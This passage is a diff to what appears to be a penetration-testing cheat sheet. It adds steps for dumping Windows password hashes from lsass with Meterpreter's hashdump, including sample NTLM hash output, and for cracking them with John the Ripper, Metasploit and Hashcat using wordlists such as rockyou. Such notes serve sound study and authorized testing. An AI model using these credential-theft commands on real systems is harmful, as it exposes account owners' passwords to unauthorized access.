@@ -656,4 +656,50 @@ nc -nvlp 1234
 echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
 ```
 
+### Dumping and Cracking Windows Hashes
+#### John the Ripper
+```
+meterpreter > ps -S lsass.exe
+meterpreter > migrate <pid>
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+- Hashes will appear in `creds`.
+
+```
+vi hashes.txt
+
+Paste Administrator and bob's hashes into the text file
+
+john --format=NT hashes.txt
+
+cat .john/john.pot
+
+rm -rf /root/.john
+john --format=NT hashes.txt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+- Default wordlist `/usr/share/john/password.lst`.
+
+```
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+- Alternative wordlist.
+
+```
+use auxiliary/analyze/crack_windows
+set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+#### Hashcat
+```
+hashcat --help
+
+hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt
+
+cat .hashcat/hashcat.potfile
+```
+
 ## Social Engineering
